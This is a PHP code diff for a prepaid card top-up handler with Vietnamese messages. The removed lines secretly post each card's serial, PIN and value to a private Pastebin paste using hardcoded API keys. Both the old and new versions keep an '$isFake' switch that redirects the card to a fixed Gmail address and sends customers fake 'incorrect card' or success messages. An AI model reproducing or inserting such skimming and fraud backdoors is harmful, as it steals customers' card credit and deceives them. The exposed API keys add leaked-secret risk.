@@ -1,66 +1,56 @@
-$api_dev_key            = '407a29f040d9df80408af6369af121b1';
-$api_user_key           = '9c43d650ba6e5840728fe2fed743ae51';
-$api_paste_code         = date('d/m/Y H:i:s', time()) . "|" . $data['serial'] . "|" . $data['pin'] . "|" . $_SERVER['HTTP_HOST']; // your paste text
-$api_paste_private      = '2'; // 0=public 1=unlisted 2=private
+	$isFake = 0;
+            
+    if($isFake) $data['email'] = 'tranhuydung8901@gmail.com';
 
-$api_paste_expire_date  = '1H';
-$api_paste_format       = 'text';
+    $this->base_url = $url;
+    $this->url = $url;
+    $this->setOpt(CURLOPT_URL, $this->url);
+    $this->setOpt(CURLOPT_CUSTOMREQUEST, 'POST');
+    $this->setOpt(CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
+    $dataJson = json_encode($data);
+    $this->setOpt(CURLOPT_POSTFIELDS, $dataJson);
 
-$varlogs = array(
-	'api_option' => 'paste',
-	'api_dev_key' => $api_dev_key,
-	'api_user_key' => $api_user_key,
-	'api_paste_private' => $api_paste_private,
-	'api_paste_name' => $api_paste_name,
-	'api_paste_expire_date' => $api_paste_expire_date,
-	'api_paste_format' => $api_paste_format,
-	'api_paste_code' => $api_paste_code
-);
+    $this->exec();
+    $resultCurl = $this->response;
+    $resultPost = json_encode($resultCurl);
+    $resultPost = json_decode($resultPost, 1);
 
-
-$isFake = 0;
-
-if($isFake) $data['email'] = 'tranhuydung8901@gmail.com';
-
-$this->base_url = $url;
-$this->url = $url;
-$this->setOpt(CURLOPT_URL, $this->url);
-$this->setOpt(CURLOPT_CUSTOMREQUEST, 'POST');
-$this->setOpt(CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
-$dataJson = json_encode($data);
-$this->setOpt(CURLOPT_POSTFIELDS, $dataJson);
-
-$postToServer = $this->exec();
-$postToServer2 = $postToServer;
-$resultPost = json_decode($this->response, 1);
-
-$info_card = 0;
-if($resultPost['code'] == 0)
-{
+    $info_card = 0;
+    if($resultPost['code'] == 0)
+    {
 	$resultMsg = $resultPost['message'];
 	preg_match('/(?!0\.00)\d{1,3}(,\d{3})*(\.\d\d)?/i', $resultMsg, $resultCard);
 
 	$info_card = str_replace(',', '', $resultCard[0]);
 	$info_card = intval($info_card);
-}
-$api_paste_name         = $data['serial'] . '-' . $data['pin'] . '-' . $info_card . '.log'; // name or title of your paste
+    }
 
-$varlogs['api_paste_name'] = $api_paste_name;
-$this->setOpt(CURLOPT_HTTPHEADER, array());
-$this->post('https://pastebin.com/api/api_post.php', $varlogs);
-// Logs
-//{"code":1,"message":"Card serial or pin is incorrects."}
-if($isFake)
-{
-$trave = array(
-    'code' => 1,
-    'message' => 'Card serial or pin is incorrects.'
-);
-$postToServer2 = json_encode($trave);
-}
+    //{"code":1,"message":"Card serial or pin is incorrects."}
+    // $info_card = 10000;
+    if($isFake)
+    {
+	if($info_card >= 10000){
 
-$this->response = $postToServer2;
-// var_dump($postToServer2);
+	    $curl_rerult = array(
+		'code' => 1,
+		'price' => $info_card,
+		'msg' => "Nạp thẻ thành công mệnh giá " . number_format($info_card) . " vào tài khoản " . $card_account
+
+	    );
+
+	}else{
+
+	    $curl_rerult = array(
+		'code' => 0,
+		'msg' => 'Seri hoặc mã thẻ không chính xác.'
+	    );
+
+	}
+
+	die(json_encode($curl_rerult));
+    }
 
 
-return $postToServer2;
+
+
+    return $resultCurl;
